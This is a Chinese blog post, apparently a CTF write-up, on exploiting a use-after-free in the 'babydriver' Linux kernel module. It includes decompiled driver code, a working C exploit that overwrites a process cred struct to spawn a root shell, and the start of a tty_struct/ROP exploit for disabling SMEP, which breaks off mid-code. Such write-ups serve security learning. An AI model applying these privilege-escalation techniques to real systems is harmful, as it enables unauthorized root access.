      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="BruceFan's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2017/08/15/Linux-Kernel-UAF/" class="post-title-link" itemprop="url">Linux Kernel UAF</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建于：2017-08-15 15:44:38" itemprop="dateCreated datePublished" datetime="2017-08-15T15:44:38+08:00">2017-08-15</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="更新于：2020-11-12 10:26:14" itemprop="dateModified" datetime="2020-11-12T10:26:14+08:00">2020-11-12</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="题目概述"><a href="#题目概述" class="headerlink" title="题目概述"></a>题目概述</h2><p>这是一道CTF的<a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1qYsNeKO">kernel题</a>，题目不是很难，但是可以学到很多知识，下面会用两种方法对这个题目进行解决：<br>1.修改进程的cred结构体中权限相关的信息，将权限改为root；<br>2.通过ROP将cr4中的smep位置反，关闭SMEP机制，然后ret2usr获取root权限。<br>题目给出了三个文件：rootfs.cpio、bzImage和boot.sh。boot.sh内容如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;bash</span><br><span class="line"></span><br><span class="line">qemu-system-x86_64 -initrd rootfs.cpio -kernel bzImage -append &#39;console&#x3D;ttyS0 root&#x3D;&#x2F;dev&#x2F;ram oops&#x3D;panic panic&#x3D;1&#39; -enable-kvm -monitor &#x2F;dev&#x2F;null -m 64M --nographic  -smp cores&#x3D;1,threads&#x3D;1 -cpu kvm64,+smep</span><br></pre></td></tr></table></figure>
<p>需要用qemu启动，bzImage是kernel映像，rootfs.cpio是根文件的映像。我用的VMware里的Linux虚拟机安装qemu，这里会报一个KVM的错误，需要开启一下虚拟化功能：<br><img src="/images/linuxkernel/virtualkvm.png"><br>如果要调试的话，可以在boot.sh中加入参数<code>-gdb tcp::1234 -S</code>，这样系统启动时会挂起等待gdb连接，gdb中用<code>target remote :1234</code>连接即可。<br>要向系统中添加文件，就需要解包cpio文件，将文件放到目录中再打包：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ file rootfs.cpio</span><br><span class="line">rootfs.cpio: gzip compressed data, last modified: Tue Jul  4 08:39:15 2017, max compression, from Unix</span><br><span class="line">$ mv rootfs.cpio rootfs.cpio.gz</span><br><span class="line">$ gunzip rootfs.cpio.gz</span><br><span class="line">$ file rootfs.cpio </span><br><span class="line">rootfs.cpio: ASCII cpio archive (SVR4 with no CRC)</span><br><span class="line">$ cpio -idmv &lt; rootfs.cpio</span><br><span class="line">&#x2F;&#x2F; 解包完成，可以向目录中添加文件</span><br><span class="line">$ ls</span><br><span class="line">bin  etc  home  init  lib  linuxrc  proc  rootfs.cpio  sbin  sys  tmp  usr</span><br><span class="line">&#x2F;&#x2F; 重新打包，不需要压缩也可以</span><br><span class="line">$ find . | cpio -o --format&#x3D;newc &gt; ..&#x2F;rootfs.cpio</span><br></pre></td></tr></table></figure>
<p>babydriver.ko文件在<code>/lib/modules/</code>目录中，通过查看/proc/modules或lsmod可以看到babydriver.ko已经加载到内核，还能看到其加载地址。用IDA反编译babydriver.ko驱动。<br>open函数：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">babyopen</span><span class="params">(inode *inode, file *filp,__int64 a3, __int64 a4)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *v4; <span class="comment">// rax@1</span></span><br><span class="line">    __int64 v5; <span class="comment">// rdx@1</span></span><br><span class="line">    </span><br><span class="line">    __fentry__(inode, filp, a3, a4);</span><br><span class="line">    LODWORD(v4) = kmem_cache_alloc_trace(*((_QWORD*)&amp;kmalloc_caches + <span class="number">6</span>),  <span class="number">0x24000C0</span>LL, <span class="number">64L</span>L);</span><br><span class="line">    babydev_struct.device_buf = v4;</span><br><span class="line">    babydev_struct.device_buf_len = <span class="number">64L</span>L;</span><br><span class="line">    printk(<span class="string">&quot;device open\n&quot;</span>, <span class="number">0x24000C0</span>LL, v5);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ioctl函数：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">babyioctl</span><span class="params">(file *filp, __int64 command, <span class="keyword">unsigned</span> __int64 arg, __int64 a4)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> v4; <span class="comment">// rdx@1</span></span><br><span class="line">    <span class="keyword">size_t</span> v5; <span class="comment">// rbx@1</span></span><br><span class="line">    <span class="keyword">char</span> *v6; <span class="comment">// rax@2</span></span><br><span class="line">    __int64 v7; <span class="comment">// rdx@2</span></span><br><span class="line">    __int64 result; <span class="comment">// rax@2</span></span><br><span class="line">    </span><br><span class="line">    __fentry__(filp, command, arg, a4);</span><br><span class="line">    v5 = v4;</span><br><span class="line">    <span class="keyword">if</span> ( (_DWORD)command == <span class="number">0x10001</span> ) &#123;</span><br><span class="line">        kfree(babydev_struct.device_buf);</span><br><span class="line">        LODWORD(v6) = _kmalloc(v5, <span class="number">0x24000C0</span>LL);</span><br><span class="line">        babydev_struct.device_buf = v6;</span><br><span class="line">        babydev_struct.device_buf_len = v5;</span><br><span class="line">        printk(<span class="string">&quot;alloc done\n&quot;</span>, <span class="number">0x24000C0</span>LL, v7);</span><br><span class="line">        result = <span class="number">0L</span>L;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        printk(&amp;default_arg_is_format_str, v4, v4);</span><br><span class="line">        result = <span class="number">-22L</span>L;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>write函数：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> __fastcall <span class="title">babywrite</span><span class="params">(file *filp, <span class="keyword">const</span> <span class="keyword">char</span> *buffer, <span class="keyword">size_t</span> length, <span class="keyword">loff_t</span> *offset)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> __int64 copy_len; <span class="comment">// rdx@1</span></span><br><span class="line">    <span class="keyword">ssize_t</span> result; <span class="comment">// rax@2</span></span><br><span class="line">    <span class="keyword">ssize_t</span> v6; <span class="comment">// rbx@3</span></span><br><span class="line">    </span><br><span class="line">    __fentry__(filp, buffer, length, offset);</span><br><span class="line">    <span class="keyword">if</span> ( babydev_struct.device_buf ) &#123;</span><br><span class="line">        result = <span class="number">-2L</span>L;</span><br><span class="line">        <span class="keyword">if</span> ( babydev_struct.device_buf_len &gt; copy_len ) &#123;</span><br><span class="line">            v6 = copy_len;</span><br><span class="line">            copy_from_user(babydev_struct.device_buf, buffer, copy_len);</span><br><span class="line">            result = v6;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        result = <span class="number">-1L</span>L;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>read函数：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">ssize_t</span> __fastcall <span class="title">babyread</span><span class="params">(file *filp, <span class="keyword">char</span> *buffer, <span class="keyword">size_t</span> length, <span class="keyword">loff_t</span> *offset)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> __int64 copy_len; <span class="comment">// rdx@1</span></span><br><span class="line">    <span class="keyword">ssize_t</span> result; <span class="comment">// rax@2</span></span><br><span class="line">    <span class="keyword">ssize_t</span> v6; <span class="comment">// rbx@3</span></span><br><span class="line">    </span><br><span class="line">    __fentry__(filp, buffer, length, offset);</span><br><span class="line">    <span class="keyword">if</span> ( babydev_struct.device_buf ) &#123;</span><br><span class="line">        result = <span class="number">-2L</span>L;</span><br><span class="line">        <span class="keyword">if</span> ( babydev_struct.device_buf_len &gt; copy_len ) &#123;</span><br><span class="line">            v6 = copy_len;</span><br><span class="line">            copy_to_user(buffer, babydev_struct.device_buf, copy_len);</span><br><span class="line">            result = v6;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        result = <span class="number">-1L</span>L;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>驱动代码并不复杂，有一个<code>babydev_struct</code>全局结构体变量，结构体里有<code>device_buf</code>和<code>device_buf_len</code>两个成员变量，device_buf在调用open时通过<code>kmem_cache_alloc_trace</code>进行分配，这个函数的效果和<a target="_blank" rel="noopener" href="http://elixir.free-electrons.com/linux/v4.4.72/source/include/linux/slab.h#L446">kmalloc</a>是一样的。应该是因为编译时编译器进行了优化。<br>open的时候kmalloc了一个大小为64的内存空间，设置size为64，release的时候释放这个空间。read和write都会先检查buf指针是否为NULL，大小是否满足要求，没有明显的栈溢出或堆溢出。<br>如果open两次设备文件，第一次open初始化了全局变量<code>baby_struct</code>，第二次open会再次给它赋值，这样会覆盖第一次的buf指针。下面接着release第一次打开的设备，其实释放的是第二次打开设备时分配的内存，而这块内存还可以被<code>baby_struct</code>的buf指针使用，就造成了一个UAF。  </p>
<h2 id="修改cred结构体"><a href="#修改cred结构体" class="headerlink" title="修改cred结构体"></a>修改cred结构体</h2><p>一个进程的权限是由<a target="_blank" rel="noopener" href="http://elixir.free-electrons.com/linux/v4.4.72/source/include/linux/cred.h#L118">cred结构体</a>中的uid决定的，每个进程中都有一个cred结构体，并且保存了该进程的权限信息，如果能修改cred信息，就可以进行提权。<br>通过之前对<a target="_blank" rel="noopener" href="http://pwn4.fun/2017/06/12/Exploiting-Linux-Kernel-Heap-Corruptions/">slub分配器的了解</a>，相同大小的内存块放在一起。于是思路就是：现在有一个UAF，将某个进程的cred结构体放进这个UAF内存空间，然后就可以控制这个cred结构体。<br>具体操作如下：  </p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CRED_SIZE 168</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DEV_NAME <span class="meta-string">&quot;/dev/babydev&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">100</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> fd1, fd2, ret;</span><br><span class="line">    <span class="keyword">char</span> zero_buf[<span class="number">100</span>];</span><br><span class="line">    <span class="built_in">memset</span>(zero_buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(<span class="keyword">char</span>) * <span class="number">100</span>);</span><br><span class="line">    fd1 = open(DEV_NAME, O_RDWR);</span><br><span class="line">    fd2 = open(DEV_NAME, O_RDWR);</span><br><span class="line">    <span class="comment">// 首先通过ioctl改变第一次open的内存大小，使其和cred结构体一样大小</span></span><br><span class="line">    ret = ioctl(fd1, <span class="number">0x10001</span>, CRED_SIZE);</span><br><span class="line">    <span class="comment">// release第一次open，释放一个cred结构体一样大小的内存</span></span><br><span class="line">    close(fd1);</span><br><span class="line">    <span class="comment">// fork一个新进程来创建一个cred结构体，这个cred结构体就会用刚刚释放的内存，即UAF内存空间</span></span><br><span class="line">    <span class="keyword">int</span> now_uid = <span class="number">1000</span>; <span class="comment">// 当前uid为1000</span></span><br><span class="line">    <span class="keyword">int</span> pid = fork();</span><br><span class="line">    <span class="keyword">if</span> (pid &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;fork error&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (pid == <span class="number">0</span>) &#123; <span class="comment">// child process</span></span><br><span class="line">        <span class="comment">// 写入28个0，一直到egid及其之前的都变为了0，这个时候就已经会被认为是root了</span></span><br><span class="line">        ret = write(fd2, zero_buf, <span class="number">28</span>);</span><br><span class="line">        now_uid = getuid();</span><br><span class="line">        <span class="keyword">if</span> (!now_uid) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;get root done\n&quot;</span>);</span><br><span class="line">            <span class="comment">// 权限修改完毕，启动一个shell，就是root的shell了</span></span><br><span class="line">            system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;failed?&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        wait(<span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    close(fd2);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>将上述exploit编译后放到/home/ctf目录中打包cpio，启动qemu：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$ gcc -static -o exp1 exp1.c</span><br><span class="line">$ cp exp1 tmp&#x2F;home&#x2F;ctf     &#x2F;&#x2F; 之前的rootfs.cpio解压到了tmp文件夹</span><br><span class="line">$ find tmp | cpio -o --format&#x3D;newc &gt; rootfs.cpio</span><br><span class="line">$ .&#x2F;boot.sh</span><br><span class="line">...</span><br><span class="line">&#x2F; $ cd home&#x2F;ctf&#x2F;</span><br><span class="line">~ $ ls</span><br><span class="line">exp1</span><br><span class="line">~ $ .&#x2F;exp1 </span><br><span class="line">[   16.298785] device open</span><br><span class="line">[   16.299639] device open</span><br><span class="line">[   16.300396] alloc done</span><br><span class="line">[   16.301763] device release</span><br><span class="line">get root done</span><br><span class="line">&#x2F;home&#x2F;ctf #</span><br></pre></td></tr></table></figure>
<p>还有一个问题是如何知道cred的大小，一种方法是看<a target="_blank" rel="noopener" href="http://elixir.free-electrons.com/linux/v4.4.72/source/include/linux/cred.h#L118">源码</a>，这种方法比较慢，还容易出错。另一种方法是编译一个内核模块来查看：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/cred.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;Dual BSD/GPL&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">hello_init</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    printk(KERN_ALERT <span class="string">&quot;sizeof cred: %d&quot;</span>, <span class="keyword">sizeof</span>(struct cred));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">hello_exit</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    printk(KERN_ALERT <span class="string">&quot;exit module!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(hello_init);</span><br><span class="line">module_exit(hello_exit);</span><br></pre></td></tr></table></figure>
<p>Makefile：</p>
<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">obj-m := cred_size.o</span><br><span class="line">KERNELBUILD := /lib/modules/<span class="variable">$(<span class="built_in">shell</span> uname -r)</span>/build</span><br><span class="line"></span><br><span class="line"><span class="section">modules:</span></span><br><span class="line">    make -C <span class="variable">$(KERNELBUILD)</span> M=<span class="variable">$(CURDIR)</span> modules</span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">    make -C <span class="variable">$(KERNELBUILD)</span> M=<span class="variable">$(CURDIR)</span> clean</span><br></pre></td></tr></table></figure>

<h2 id="ROP关闭SMEP"><a href="#ROP关闭SMEP" class="headerlink" title="ROP关闭SMEP"></a>ROP关闭SMEP</h2><p>想要获得程序控制流并使用ROP就需要借助tty_struct这个结构体，tty是一种设备，通过<code>/dev/ptmx</code>可以打开这个设备。要得到内核控制流，需要修改设备的函数指针，使得对这个设备的操作变成可以控制的。获得控制流后，通过ROP的方法可以将cr4中的smep位关掉，之后就可以ret2usr进行传统的提权操作了。<br>内核空间ROP在<a target="_blank" rel="noopener" href="http://pwn4.fun/2017/06/28/Linux-x64%E5%86%85%E6%A0%B8ROP/">之前的文章</a>中介绍过，需要一个xchg eax, esp的gadget，自己构造一个栈。这里有一个前提知识，在执行ioctl的时候eax正好是要执行的指令的地址，也就是gadget自身的地址。这样我们就可以mmap这个gadget地址，栈就落在了用户空间。虽然不能执行用户空间的代码，但是可以从用户栈上获取数据，执行内核空间代码。<br>gadget要从内核中找，bzImage是压缩过的vmlinux，通过Linux源码scripts目录下的extract-vmlinux来提取。<br>下面是完整的exploit：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pty.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/sem.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TTY_STRUCT_SIZE 0x2e0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SPRAY_ALLOC_TIMES 0x100</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> spray_fd[<span class="number">0x100</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">/* // 将tty_struct放入UAF空间，将第24字节的位置用伪造的tty_operations替换，如147、148行所示</span></span><br><span class="line"><span class="comment">tty_struct:</span></span><br><span class="line"><span 